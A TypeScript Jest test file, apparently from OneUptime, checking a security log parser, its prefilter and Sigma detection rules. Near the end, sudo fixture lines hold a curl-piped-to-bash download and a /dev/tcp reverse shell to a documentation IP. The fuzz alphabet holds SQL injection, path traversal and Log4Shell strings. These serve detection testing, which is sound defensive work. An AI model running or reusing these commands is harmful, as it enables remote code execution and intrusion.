import { describe, expect, test } from "@jest/globals";
import { JSONObject } from "../../../../Types/JSON";
import {
  SECURITY_LOG_RESOURCE_ID_ATTRIBUTE,
  SECURITY_LOG_RESOURCE_TYPE_ATTRIBUTE,
} from "../../../../Types/SecurityCase/SecurityConnection";
import ServiceType from "../../../../Types/Telemetry/ServiceType";
import { readSecurityLogResource } from "../../../../Utils/SecurityCase/SecurityConnectionMatch";
import { DetectionRuleDataKind } from "../../../../Types/SecurityEvent/DetectionRuleDataKind";
import {
  DETECTION_RULE_LIBRARY,
  DetectionRuleLibraryEntry,
  getRecommendedDetectionRules,
} from "../../../../Types/SecurityEvent/DetectionRuleLibrary";
import NormalizedSecurityEvent from "../../../../Types/SecurityEvent/NormalizedSecurityEvent";
import SecurityLogFormat, {
  SECURITY_LOG_FORMATS,
  SECURITY_LOG_FORMAT_ATTRIBUTE,
  SecurityLogFormatDefinition,
} from "../../../../Types/SecurityEvent/SecurityLogFormat";
import SigmaRule from "../../../../Types/SecurityEvent/SigmaRule";
import SecurityLogParser, {
  SECURITY_LOG_PREFILTER,
  matchesSecurityLogPrefilter,
} from "../../../../Utils/SecurityEvent/LogParsers/SecurityLogParser";
import SigmaRuleParser from "../../../../Utils/SecurityEvent/Sigma/SigmaRuleParser";
import SigmaRuleSetParser from "../../../../Utils/SecurityEvent/Sigma/SigmaRuleSetParser";
import {
  DetectionRuleDefinition,
  SigmaCorrelationStep,
} from "../../../../Types/SecurityEvent/SigmaCorrelation";
import { FastestRun, fastestRun } from "../../../Helpers/FastestRun";
import { generatedTexts } from "../../../Helpers/GeneratedTexts";
import {
  NOT_SSH_SIGN_INS,
  NOT_SUDO_LINES,
  NOT_WEB_ATTACKS,
  SSH_LINES,
  SUDO_LINES,
  WEB_LINES,
  auditEvent,
  cloudTrailRecord,
  logLine,
} from "./LogParserFixtures";
import { sigmaRuleMatchesEvent } from "./SigmaTestMatcher";

function parse(body: string): Array<NormalizedSecurityEvent> {
  return SecurityLogParser.parse(logLine(body, { "host.name": "web-03" }));
}

function formatOf(event: NormalizedSecurityEvent | undefined): string {
  return String(event?.attributes[SECURITY_LOG_FORMAT_ATTRIBUTE] || "");
}

const AUDIT_EXEC: string = JSON.stringify(
  auditEvent({
    verb: "create",
    objectRef: {
      resource: "pods",
      namespace: "default",
      name: "web-7d9",
      subresource: "exec",
    },
  }),
);

const AUDIT_PRIVILEGED_POD: string = JSON.stringify(
  auditEvent({
    verb: "create",
    user: {
      username: "system:serviceaccount:kube-system:daemon-set-controller",
    },
    objectRef: { resource: "pods", namespace: "monitoring" },
    requestObject: {
      spec: { containers: [{ securityContext: { privileged: true } }] },
    },
  }),
);

const AUDIT_CLUSTER_ADMIN: string = JSON.stringify(
  auditEvent({
    verb: "create",
    objectRef: { resource: "clusterrolebindings", name: "ops-admin" },
    requestObject: { roleRef: { name: "cluster-admin" } },
  }),
);

const AUDIT_FORBIDDEN: string = JSON.stringify(
  auditEvent({
    verb: "list",
    user: { username: "system:serviceaccount:kube-system:job-controller" },
    objectRef: { resource: "secrets" },
    responseStatus: { code: 403 },
  }),
);

const CLOUDTRAIL_LINES: Record<string, string> = {
  accessKey: JSON.stringify(cloudTrailRecord({})),
  stopLogging: JSON.stringify(
    cloudTrailRecord({
      eventSource: "cloudtrail.amazonaws.com",
      eventName: "StopLogging",
    }),
  ),
  guardDuty: JSON.stringify(
    cloudTrailRecord({
      eventSource: "guardduty.amazonaws.com",
      eventName: "DeleteDetector",
    }),
  ),
  root: JSON.stringify(
    cloudTrailRecord({
      eventName: "PutBucketPolicy",
      eventSource: "s3.amazonaws.com",
      userIdentity: { type: "Root", arn: "arn:aws:iam::111122223333:root" },
    }),
  ),
  consoleWithoutMfa: JSON.stringify(
    cloudTrailRecord({
      eventSource: "signin.amazonaws.com",
      eventName: "ConsoleLogin",
      readOnly: undefined,
      responseElements: { ConsoleLogin: "Success" },
      additionalEventData: { MFAUsed: "No" },
    }),
  ),
  accessDenied: JSON.stringify(
    cloudTrailRecord({
      eventName: "ListUsers",
      readOnly: true,
      errorCode: "AccessDenied",
    }),
  ),
};

// Every line a parser turns into events, by the format it turns into.
const EVENT_LINES: Array<[SecurityLogFormat, string]> = [
  ...Object.values(SSH_LINES).map(
    (line: string): [SecurityLogFormat, string] => {
      return [SecurityLogFormat.SshSignIn, line];
    },
  ),
  ...Object.values(SUDO_LINES).map(
    (line: string): [SecurityLogFormat, string] => {
      return [SecurityLogFormat.Sudo, line];
    },
  ),
  [SecurityLogFormat.KubernetesAudit, AUDIT_EXEC],
  [SecurityLogFormat.KubernetesAudit, AUDIT_PRIVILEGED_POD],
  [SecurityLogFormat.KubernetesAudit, AUDIT_CLUSTER_ADMIN],
  [SecurityLogFormat.KubernetesAudit, AUDIT_FORBIDDEN],
  ...Object.values(CLOUDTRAIL_LINES).map(
    (line: string): [SecurityLogFormat, string] => {
      return [SecurityLogFormat.AwsCloudTrail, line];
    },
  ),
  ...Object.values(WEB_LINES).map(
    (line: string): [SecurityLogFormat, string] => {
      return [SecurityLogFormat.WebAttack, line];
    },
  ),
];

describe("SecurityLogParser", () => {
  test.each(EVENT_LINES)(
    "a %s line becomes events of that format: %s",
    (format: SecurityLogFormat, line: string) => {
      const events: Array<NormalizedSecurityEvent> = parse(line);

      expect(events.length).toBeGreaterThan(0);

      for (const event of events) {
        expect(formatOf(event)).toBe(format);
      }
    },
  );

  test("lines that hold no security record are no events", () => {
    for (const line of [
      ...NOT_SSH_SIGN_INS,
      ...NOT_SUDO_LINES,
      ...NOT_WEB_ATTACKS,
      JSON.stringify(auditEvent({ verb: "get" })),
      JSON.stringify(
        cloudTrailRecord({ eventName: "ListUsers", readOnly: true }),
      ),
      "GET /index.html 200",
    ]) {
      expect(parse(line)).toEqual([]);
    }
  });

  test("every format has a definition the Connections page and the docs read", () => {
    const formats: Array<string> = SECURITY_LOG_FORMATS.map(
      (definition: SecurityLogFormatDefinition): string => {
        return definition.format;
      },
    );

    expect(formats.sort()).toEqual(
      Object.values(SecurityLogFormat).slice().sort(),
    );

    for (const definition of SECURITY_LOG_FORMATS) {
      expect(definition.title).not.toBe("");
      expect(definition.description.endsWith(".")).toBe(true);
      expect(definition.productName).not.toBe("");
    }
  });

  test("each format's example line is one the parsers read as that format", () => {
    for (const definition of SECURITY_LOG_FORMATS) {
      const events: Array<NormalizedSecurityEvent> = parse(definition.example);

      expect([definition.format, events.length > 0]).toEqual([
        definition.format,
        true,
      ]);
      expect(formatOf(events[0])).toBe(definition.format);
    }
  });
});

/*
 * The log scan asks the database only for lines holding the prefilter's
 * words, so a line a parser would turn into an event but the prefilter
 * would not let through is a security event silently never found. Every
 * line the parsers read must pass it.
 */
describe("SECURITY_LOG_PREFILTER", () => {
  test.each(EVENT_LINES)(
    "lets the %s line through: %s",
    (_format: SecurityLogFormat, line: string) => {
      expect(matchesSecurityLogPrefilter(line)).toBe(true);
    },
  );

  test("holds every line the parsers turn into events, across thousands of generated lines", () => {
    const alphabet: Array<string> = [
      "Failed password for ",
      "Failed publickey for ",
      "Accepted password for ",
      "invalid user ",
      "Invalid user ",
      "root",
      "admin",
      " from ",
      "203.0.113.7",
      "2001:db8::1",
      " port ",
      "22",
      " ssh2",
      "alice",
      " : ",
      "TTY=pts/0",
      " ; ",
      "USER=root",
      " ; COMMAND=",
      "/bin/bash",
      "3 incorrect password attempts",
      '"GET ',
      ' HTTP/1.1" ',
      "200 ",
      "/item?id=1' or 1=1",
      "../../",
      "${jndi:ldap://x}",
      "union select ",
      " ",
      '"',
    ];
    let parsed: number = 0;

    for (const text of generatedTexts(20000, 8812, alphabet, 14)) {
      const events: Array<NormalizedSecurityEvent> = SecurityLogParser.parse(
        logLine(text),
      );

      if (events.length > 0) {
        parsed++;
        expect([text, matchesSecurityLogPrefilter(text)]).toEqual([text, true]);
      }
    }

    // The alphabet is built to make sign-ins, sudo lines and attacks often.
    expect(parsed).toBeGreaterThan(1000);
  });

  test("its words are lowercase, as the case-insensitive match needs", () => {
    const words: Array<string> = [
      ...SECURITY_LOG_PREFILTER.anyOf,
      ...SECURITY_LOG_PREFILTER.groups.flatMap(
        (
          group: (typeof SECURITY_LOG_PREFILTER.groups)[number],
        ): Array<string> => {
          return [
            group.requires,
            ...group.anyOf,
            ...(group.noneOf || []),
            ...(group.unlessAnyOf || []),
          ];
        },
      ),
    ];

    for (const word of words) {
      expect(word).toBe(word.toLowerCase());
      expect(word.length).toBeGreaterThan(0);
    }

    // multiSearchAnyCaseInsensitive takes at most 255 needles at once.
    expect(SECURITY_LOG_PREFILTER.anyOf.length).toBeLessThan(255);
  });

  test("keeps the control plane's routine audit records out, but not its refusals or privileged pods", () => {
    const lease: string = JSON.stringify(
      auditEvent({
        verb: "update",
        user: { username: "system:node:node-1" },
        objectRef: { resource: "leases" },
      }),
    );
    const controllerSecretRead: string = JSON.stringify(
      auditEvent({
        verb: "get",
        user: { username: "system:kube-controller-manager" },
        objectRef: { resource: "secrets" },
      }),
    );

    expect(matchesSecurityLogPrefilter(lease)).toBe(false);
    expect(matchesSecurityLogPrefilter(controllerSecretRead)).toBe(false);
    expect(matchesSecurityLogPrefilter(AUDIT_FORBIDDEN)).toBe(true);
    expect(matchesSecurityLogPrefilter(AUDIT_PRIVILEGED_POD)).toBe(true);
  });

  test("keeps CloudTrail's plain reads out", () => {
    expect(
      matchesSecurityLogPrefilter(
        JSON.stringify(
          cloudTrailRecord({ eventName: "DescribeInstances", readOnly: true }),
        ),
      ),
    ).toBe(false);
  });
});

/*
 * The point of reading logs for security records: the recommended rules
 * fire on them. Each recommended rule that reads a format "Your logs"
 * makes is shown matching an event a real log line becomes - by the rule's
 * own Sigma detection, read the way the engine reads it.
 */
describe("the recommended rules fire on what the log parsers make", () => {
  const EXPECTED_MATCHES: Array<[string, string]> = [
    ["Brute force from one IP address", SSH_LINES.failedPasswordInvalidUser],
    ["Password spraying", SSH_LINES.failedPasswordRoot],
    ["Repeated failed sign-ins for one account", SUDO_LINES.wrongPassword],
    ["Password hashes read on Linux", SUDO_LINES.commandRun],
    ["CloudTrail logging stopped", CLOUDTRAIL_LINES["stopLogging"]!],
    ["GuardDuty detector removed", CLOUDTRAIL_LINES["guardDuty"]!],
    ["AWS root account used", CLOUDTRAIL_LINES["root"]!],
    ["Console sign-in without MFA", CLOUDTRAIL_LINES["consoleWithoutMfa"]!],
    ["Access key created", CLOUDTRAIL_LINES["accessKey"]!],
    ["Burst of access-denied API calls", CLOUDTRAIL_LINES["accessDenied"]!],
    ["SQL injection attempts", WEB_LINES.sqlInjectionEncoded],
    ["Path traversal attempts", WEB_LINES.pathTraversal],
    ["Log4Shell exploit attempt", WEB_LINES.log4ShellInUserAgent],
    ["Shell opened in a pod", AUDIT_EXEC],
    ["Privileged pod created", AUDIT_PRIVILEGED_POD],
    ["Cluster-admin granted", AUDIT_CLUSTER_ADMIN],
  ];

  function ruleTitled(title: string): DetectionRuleLibraryEntry {
    const entry: DetectionRuleLibraryEntry | undefined =
      DETECTION_RULE_LIBRARY.find(
        (candidate: DetectionRuleLibraryEntry): boolean => {
          return candidate.title === title;
        },
      );

    expect(entry).toBeDefined();

    return entry!;
  }

  test.each(EXPECTED_MATCHES)(
    "%s fires on an event from the logs",
    (title: string, line: string) => {
      const rule: SigmaRule = SigmaRuleParser.parse(
        ruleTitled(title).sigmaRuleYaml,
      );
      const events: Array<NormalizedSecurityEvent> = parse(line);

      expect(events.length).toBeGreaterThan(0);
      expect(
        events.some((event: NormalizedSecurityEvent): boolean => {
          return sigmaRuleMatchesEvent(rule, event);
        }),
      ).toBe(true);
    },
  );

  /*
   * A recommended correlation fires on a run of events, not on one: each of
   * its steps is shown matching the log line it reads.
   */
  const EXPECTED_STEP_MATCHES: Array<[string, string, string]> = [
    [
      "Failed sign-ins, then a success from the same address",
      "Failed sign-in",
      SSH_LINES.failedPasswordInvalidUser,
    ],
    [
      "Failed sign-ins, then a success from the same address",
      "Successful sign-in",
      SSH_LINES.acceptedPublicKey,
    ],
  ];

  function correlationTitled(
    title: string,
  ): Extract<DetectionRuleDefinition, { kind: "correlation" }> {
    const definition: DetectionRuleDefinition = SigmaRuleSetParser.parse(
      ruleTitled(title).sigmaRuleYaml,
    );

    if (definition.kind !== "correlation") {
      throw new Error(`${title} is not a correlation`);
    }

    return definition;
  }

  // The Sigma rules a step reads: its own, or the ones a counting step counts.
  function stepRules(step: SigmaCorrelationStep): Array<SigmaRule> {
    return step.rule ? [step.rule] : step.count ? step.count.rules : [];
  }

  test.each(EXPECTED_STEP_MATCHES)(
    "%s: its step %s fires on an event from the logs",
    (title: string, stepTitle: string, line: string) => {
      const definition: Extract<
        DetectionRuleDefinition,
        { kind: "correlation" }
      > = correlationTitled(title);
      const rules: Array<SigmaRule> = definition.steps.flatMap(stepRules);
      const rule: SigmaRule | undefined = rules.find(
        (candidate: SigmaRule): boolean => {
          return candidate.title === stepTitle;
        },
      );
      const events: Array<NormalizedSecurityEvent> = parse(line);

      expect(rule).toBeDefined();
      expect(events.length).toBeGreaterThan(0);
      expect(
        events.some((event: NormalizedSecurityEvent): boolean => {
          return sigmaRuleMatchesEvent(rule!, event);
        }),
      ).toBe(true);
    },
  );

  test("a successful sign-in fires none of them", () => {
    const events: Array<NormalizedSecurityEvent> = parse(
      SSH_LINES.acceptedPublicKey,
    );

    expect(events).toHaveLength(1);

    for (const entry of getRecommendedDetectionRules()) {
      // A correlation needs more than one event (its steps are shown above).
      if (SigmaRuleSetParser.isCorrelationYaml(entry.sigmaRuleYaml)) {
        continue;
      }

      const rule: SigmaRule = SigmaRuleParser.parse(entry.sigmaRuleYaml);

      expect([entry.title, sigmaRuleMatchesEvent(rule, events[0]!)]).toEqual([
        entry.title,
        false,
      ]);
    }
  });

  test("every recommended rule that reads a log format is shown firing above", () => {
    const shown: Set<string> = new Set([
      ...EXPECTED_MATCHES.map((match: [string, string]): string => {
        return match[0];
      }),
      ...EXPECTED_STEP_MATCHES.map(
        (match: [string, string, string]): string => {
          return match[0];
        },
      ),
    ]);
    // Your OneUptime data, which no log format makes: TelemetryLibraryRules shows these firing.
    const oneUptimeData: Array<DetectionRuleDataKind> = [
      DetectionRuleDataKind.OneUptimeTraces,
      DetectionRuleDataKind.NetworkFlows,
      DetectionRuleDataKind.OneUptimeAuditLog,
      DetectionRuleDataKind.SessionReplays,
    ];
    const notShown: Array<string> = getRecommendedDetectionRules()
      .filter((entry: DetectionRuleLibraryEntry): boolean => {
        return !oneUptimeData.includes(entry.dataKind);
      })
      .map((entry: DetectionRuleLibraryEntry): string => {
        return entry.title;
      })
      .filter((title: string): boolean => {
        return !shown.has(title);
      });

    // These read process events sudo writes only when the command matches.
    expect(notShown.sort()).toEqual(
      [
        "Download piped into a shell",
        "Reverse shell",
        "Shell history cleared or disabled",
      ].sort(),
    );
  });

  test.each([
    [
      "Download piped into a shell",
      "alice : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/sh -c curl -s https://get.example/x | bash",
    ],
    [
      "Reverse shell",
      "alice : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/bash -c bash -i >& /dev/tcp/203.0.113.9/4444 0>&1",
    ],
    [
      "Shell history cleared or disabled",
      "alice : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/bash -c history -c",
    ],
  ])("%s fires on a command run with sudo", (title: string, line: string) => {
    const rule: SigmaRule = SigmaRuleParser.parse(
      ruleTitled(title).sigmaRuleYaml,
    );
    const events: Array<NormalizedSecurityEvent> = parse(line);

    expect(events).toHaveLength(1);
    expect(sigmaRuleMatchesEvent(rule, events[0]!)).toBe(true);
  });
});

/*
 * Log lines are written by anyone: the time to read one must grow in line
 * with it. 400,000 characters of each parser's worst shape within two
 * seconds (FastestRun takes the best of a few attempts).
 */
describe("reading a long line takes time in line with it", () => {
  const LENGTH: number = 400000;

  const SHAPES: Array<[string, string]> = [
    ["many Failed markers", "Failed password for ".repeat(LENGTH / 20)],
    ["many froms", `Failed password for ${"x from ".repeat(LENGTH / 7)}`],
    [
      "many sudo fields",
      `a : ${"TTY=x ; ".repeat(LENGTH / 8)} ; COMMAND=/bin/ls`,
    ],
    ["many quotes", `203.0.113.1 ${'"GET '.repeat(LENGTH / 5)}`],
    [
      "a JSON audit record that never closes",
      `{"apiVersion":"audit.k8s.io/v1",${'"a":"b",'.repeat(LENGTH / 8)}`,
    ],
    [
      "a CloudTrail record that never closes",
      `{"eventSource":"x",${'"a":[1,'.repeat(LENGTH / 7)}`,
    ],
    [
      "one endless word with an attack in it",
      `${"a".repeat(LENGTH)}union select`,
    ],
    ["many attack markers", "../../".repeat(LENGTH / 6)],
  ];

  test.each(SHAPES)("%s", (_name: string, line: string) => {
    const run: FastestRun<number> = fastestRun({
      run: (): number => {
        return SecurityLogParser.parse(logLine(line)).length;
      },
      limitInMs: 2000,
    });

    expect(run.inMs).toBeLessThan(2000);
  });

  test.each(SHAPES)("the prefilter on %s", (_name: string, line: string) => {
    const run: FastestRun<boolean> = fastestRun({
      run: (): boolean => {
        return matchesSecurityLogPrefilter(line);
      },
      limitInMs: 2000,
    });

    expect(run.inMs).toBeLessThan(2000);
  });
});

describe("attributes a parser reads", () => {
  test("a line's own attributes never leak into another line's event", () => {
    const first: Array<NormalizedSecurityEvent> = SecurityLogParser.parse(
      logLine(SSH_LINES.failedPasswordRoot, { "host.name": "a" } as JSONObject),
    );
    const second: Array<NormalizedSecurityEvent> = SecurityLogParser.parse(
      logLine(SSH_LINES.failedPasswordRoot, { "host.name": "b" } as JSONObject),
    );

    expect(first[0]!.targetHost).toBe("a");
    expect(second[0]!.targetHost).toBe("b");
  });

  test("an event carries the record its log was sent under, what connects it to that host or service exactly", () => {
    const hostId: string = "0192f1a0-0000-7000-8000-0000000000aa";
    const events: Array<NormalizedSecurityEvent> = SecurityLogParser.parse({
      ...logLine(SSH_LINES.failedPasswordRoot),
      resourceId: ` ${hostId} `,
      resourceType: ServiceType.Host,
    });

    expect(events[0]!.attributes?.[SECURITY_LOG_RESOURCE_ID_ATTRIBUTE]).toBe(
      hostId,
    );
    expect(events[0]!.attributes?.[SECURITY_LOG_RESOURCE_TYPE_ATTRIBUTE]).toBe(
      ServiceType.Host,
    );
    expect(readSecurityLogResource(events[0]!.attributes)).toEqual({
      type: ServiceType.Host,
      id: hostId,
    });
  });

  test.each([
    ["no record", undefined, undefined],
    ["an id that is not one", "project-1", ServiceType.Host],
    ["an id without its type", "0192f1a0-0000-7000-8000-0000000000aa", " "],
  ])(
    "a log sent under %s connects its event to nothing",
    (_case: string, resourceId?: string, resourceType?: string) => {
      const events: Array<NormalizedSecurityEvent> = SecurityLogParser.parse({
        ...logLine(SSH_LINES.failedPasswordRoot),
        resourceId,
        resourceType,
      });

      expect(events).toHaveLength(1);
      expect(
        events[0]!.attributes?.[SECURITY_LOG_RESOURCE_ID_ATTRIBUTE],
      ).toBeUndefined();
      expect(readSecurityLogResource(events[0]!.attributes)).toBeNull();
    },
  );
});
